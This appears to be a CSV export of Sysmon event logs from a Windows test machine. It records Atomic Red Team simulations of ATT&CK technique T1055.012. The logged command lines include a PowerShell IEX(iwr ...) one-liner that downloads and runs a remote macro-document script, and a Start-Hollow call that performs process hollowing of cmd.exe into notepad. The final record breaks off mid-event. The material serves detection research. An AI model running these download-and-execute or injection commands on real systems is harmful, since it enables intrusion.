Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:02:04.430,,,,11,19578,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-74ac-658c-c301-000000000f00},3588,10972,,,,,-,2023-12-27T19:02:04.4392624Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_4ibepta5.oj1.ps1,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:02:04.430,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:02:04.4392624Z""/>
      
            
      <EventRecordID>19578</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:02:04.430</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74ac-658c-c301-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10972</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_4ibepta5.oj1.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:02:04.430</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing) 
Invoke-MalDoc -macroFile \""""C:\AtomicRedTeam\atomics\T1055.012\src\T1055.012-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""Exploit\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,1,19577,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-74ac-658c-c301-000000000f00},3588,10972,Microsoft® Windows® Operating System,,,,-,2023-12-27T19:02:04.3331133Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:02:04.331,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:02:04.3331133Z""/>
      
            
      <EventRecordID>19577</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:02:04.331</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74ac-658c-c301-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10972</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing) 
Invoke-MalDoc -macroFile \""""C:\AtomicRedTeam\atomics\T1055.012\src\T1055.012-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""Exploit\""""}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:02:02.600,,,,11,19576,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-74aa-658c-c101-000000000f00},3588,3840,,,,,DLL,2023-12-27T19:02:02.7150077Z,C:\Users\User\AppData\Local\Temp\0biydnpm.dll,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:02:02.710,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:02:02.7150077Z""/>
      
            
      <EventRecordID>19576</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">DLL</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:02:02.710</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74aa-658c-c101-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">3840</Data>
      
            
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\0biydnpm.dll</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:02:02.600</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES5096.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC48831F1E2E1E4DD7BC8B7E1B3C681BD.TMP""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft® Resource File To COFF Object Conversion Utility,,1,19575,,14.32.31326.0,"MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,CVTRES.EXE,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\0biydnpm.cmdline""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,{f57bd86a-74aa-658c-c101-000000000f00},3840,WINDEV2309EVAL\User,{f57bd86a-74aa-658c-c201-000000000f00},3588,5292,Microsoft® .NET Framework,,,,-,2023-12-27T19:02:02.7026703Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:02:02.701,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:02:02.7026703Z""/>
      
            
      <EventRecordID>19575</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:02:02.701</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74aa-658c-c201-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">5292</Data>
      
            
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe</Data>
      
            
      <Data Name=""FileVersion"">14.32.31326.0</Data>
      
            
      <Data Name=""Description"">Microsoft&#174; Resource File To COFF Object Conversion Utility</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; .NET Framework</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">CVTRES.EXE</Data>
      
            
      <Data Name=""CommandLine"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES5096.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC48831F1E2E1E4DD7BC8B7E1B3C681BD.TMP""</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-74aa-658c-c101-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">3840</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\0biydnpm.cmdline""</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\0biydnpm.cmdline""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Visual C# Command Line Compiler,,1,19574,,4.8.9032.0 built by: NET481REL1,"MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,csc.exe,"""powershell.exe"" & {. \""""C:\AtomicRedTeam\atomics\T1055.012\src\Start-Hollow.ps1\""""
$ppid=Get-Process explorer | select -expand id
Start-Hollow -Sponsor \""""C:\Windows\System32\notepad.exe\"""" -Hollow \""""C:\Windows\System32\cmd.exe\"""" -ParentPID $ppid -Verbose}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-74a8-658c-bf01-000000000f00},6844,WINDEV2309EVAL\User,{f57bd86a-74aa-658c-c101-000000000f00},3588,3840,Microsoft® .NET Framework,,,,-,2023-12-27T19:02:02.6162552Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:02:02.615,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:02:02.6162552Z""/>
      
            
      <EventRecordID>19574</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:02:02.615</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74aa-658c-c101-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">3840</Data>
      
            
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      
            
      <Data Name=""FileVersion"">4.8.9032.0 built by: NET481REL1</Data>
      
            
      <Data Name=""Description"">Visual C# Command Line Compiler</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; .NET Framework</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">csc.exe</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\0biydnpm.cmdline""</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-74a8-658c-bf01-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">6844</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {. \""""C:\AtomicRedTeam\atomics\T1055.012\src\Start-Hollow.ps1\""""
$ppid=Get-Process explorer | select -expand id
Start-Hollow -Sponsor \""""C:\Windows\System32\notepad.exe\"""" -Hollow \""""C:\Windows\System32\cmd.exe\"""" -ParentPID $ppid -Verbose}</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:02:02.600,,,,11,19573,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-74a8-658c-bf01-000000000f00},3588,6844,,,,,-,2023-12-27T19:02:02.6132127Z,C:\Users\User\AppData\Local\Temp\0biydnpm.cmdline,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:02:02.600,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:02:02.6132127Z""/>
      
            
      <EventRecordID>19573</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:02:02.600</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74a8-658c-bf01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">6844</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\0biydnpm.cmdline</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:02:02.600</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:02:02.600,,,,11,19572,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-74a8-658c-bf01-000000000f00},3588,6844,,,,,DLL,2023-12-27T19:02:02.6127845Z,C:\Users\User\AppData\Local\Temp\0biydnpm.dll,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:02:02.600,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:02:02.6127845Z""/>
      
            
      <EventRecordID>19572</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">DLL</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:02:02.600</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74a8-658c-bf01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">6844</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\0biydnpm.dll</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:02:02.600</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 19:02:00.975,,,,11,19571,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-74a8-658c-bf01-000000000f00},3588,6844,,,,,-,2023-12-27T19:02:00.9853501Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_tlvenh2m.pk3.ps1,,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:02:00.975,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:02:00.9853501Z""/>
      
            
      <EventRecordID>19571</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:02:00.975</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74a8-658c-bf01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">6844</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_tlvenh2m.pk3.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 19:02:00.975</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {. \""""C:\AtomicRedTeam\atomics\T1055.012\src\Start-Hollow.ps1\""""
$ppid=Get-Process explorer | select -expand id
Start-Hollow -Sponsor \""""C:\Windows\System32\notepad.exe\"""" -Hollow \""""C:\Windows\System32\cmd.exe\"""" -ParentPID $ppid -Verbose}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,1,19570,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-74a8-658c-bf01-000000000f00},3588,6844,Microsoft® Windows® Operating System,,,,-,2023-12-27T19:02:00.8578587Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:02:00.856,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T19:02:00.8578587Z""/>
      
            
      <EventRecordID>19570</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 19:02:00.856</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-74a8-658c-bf01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">6844</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {. \""""C:\AtomicRedTeam\atomics\T1055.012\src\Start-Hollow.ps1\""""
$ppid=Get-Process explorer | select -expand id
Start-Hollow -Sponsor \""""C:\Windows\System32\notepad.exe\"""" -Hollow \""""C:\Windows\System32\cmd.exe\"""" -ParentPID $ppid -Verbose}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\whoami.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,whoami - displays logged on user information,,1,19569,,10.0.22621.1 (WinBuild.160101.0800),"MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292",C:\Windows\System32\whoami.exe,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,whoami.exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-74a7-658c-be01-000000000f00},3588,5868,Microsoft® Windows® Operating System,,,,-,2023-12-27T19:01:59.7685055Z,,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 19:01:59.766,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
